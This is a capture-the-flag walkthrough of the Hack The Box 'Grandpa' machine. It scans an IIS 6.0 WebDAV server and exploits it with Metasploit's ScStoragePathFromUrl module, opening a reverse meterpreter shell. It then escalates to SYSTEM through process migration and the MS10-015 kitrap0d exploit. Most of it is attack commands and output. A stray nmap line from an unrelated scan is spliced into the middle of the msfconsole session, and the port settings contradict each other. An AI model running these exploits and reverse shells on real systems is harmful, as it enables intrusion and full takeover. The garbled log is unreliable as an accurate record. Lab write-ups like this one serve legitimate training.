# Grandpa

URL: https://app.hackthebox.com/machines/Grandpa

Level: Easy

Date 7 Jun 2020

## Walkthrough

- [Enumeration](#enumeration)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-ntlm-info:
|   Target_Name: GRANPA
|   NetBIOS_Domain_Name: GRANPA
|   NetBIOS_Computer_Name: GRANPA
|   DNS_Domain_Name: granpa
|   DNS_Computer_Name: granpa
|_  Product_Version: 5.2.3790
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  Server Date: Sun, 07 Jun 2020 17:40:37 GMT
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
```

We do a google search "exploit Microsoft IIS httpd 6.0" and we found:

https://www.exploit-db.com/exploits/41738

We run `msfconsole`:

```
 use ScStoragePathFromUrl

msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
RHOSTS => 10.10.10.14
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST 10.10.14.36
LHOST => 10.10.14.36
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LPORT 4444
LPORT => 4444


# Nmap 7.91 scan initiated Sat Apr  3 11:13:46 2021 as: nmap -Pn -p- -T4 -oN nmap.txt 10.10.10.5
it(windows/iis/iis_webdav_scstoragepathfromurl) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp


msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.10.10.14      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.36      yes       The listen address (an interface may be specified)
   LPORT     5000             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86
```

We run it and we get shell:

```
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.14.36:5000
[*] Trying path length 3 to 60 ...
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.36:5000 -> 10.10.10.14:1031) at 2020-07-01 23:02:13 +0200
```

Our privilege right now is:

```
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
meterpreter > sysinfo
Computer        : GRANPA
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter >
```

# Privesc

We look for processes:

```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 324   272   csrss.exe
 348   272   winlogon.exe
 396   348   services.exe
 408   348   lsass.exe
 608   396   svchost.exe
 680   396   svchost.exe
 736   396   svchost.exe
 764   396   svchost.exe
 800   396   svchost.exe
 820   3288  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 936   396   spoolsv.exe
 964   396   msdtc.exe
 1076  396   cisvc.exe
 1116  396   svchost.exe
 1176  396   inetinfo.exe
 1216  396   svchost.exe
 1328  396   VGAuthService.exe
 1408  396   vmtoolsd.exe
 1456  396   svchost.exe
 1596  396   svchost.exe
 1700  396   alg.exe
 1828  608   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
```

We notice `1828` running as `NT AUTHORITY\NETWORK SERVICE` and we try to migrate on it:

```
meterpreter > migrate 1828
[*] Migrating from 820 to 1828...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

We use suggester:

```
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use 0
msf5 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x86/windows  NT AUTHORITY\NETWORK SERVICE @ GRANPA  10.10.14.36:5000 -> 10.10.10.14:1031 (10.10.10.14)

msf5 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1


[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

We try MS10-015 (kitrap0d):

```
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
msf5 exploit(windows/local/ms10_015_kitrap0d) > options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The local listener hostname
   LPORT     8443             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf5 exploit(windows/local/ms10_015_kitrap0d) > set session 1
session => 1
msf5 exploit(windows/local/ms10_015_kitrap0d) > set LHOST tun0
LHOST => tun0

msf5 exploit(windows/local/ms10_015_kitrap0d) > options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     8443             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf5 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 4444
LPORT => 4444

```

We run it and we get System shell:

```
msf5 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.36:4444
[*] Launching notepad to host the exploit...
[+] Process 2320 launched.
[*] Reflectively injecting the exploit DLL into 2320...
[*] Injecting exploit into 2320 ...
[*] Exploit injected. Injecting payload into 2320...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.10.10.14
[*] Command shell session 2 opened (10.10.14.36:4444 -> 10.10.10.14:1062) at 2020-07-01 23:13:07 +0200


12

C:\WINDOWS\system32>>whoami
whoami
nt authority\system
```


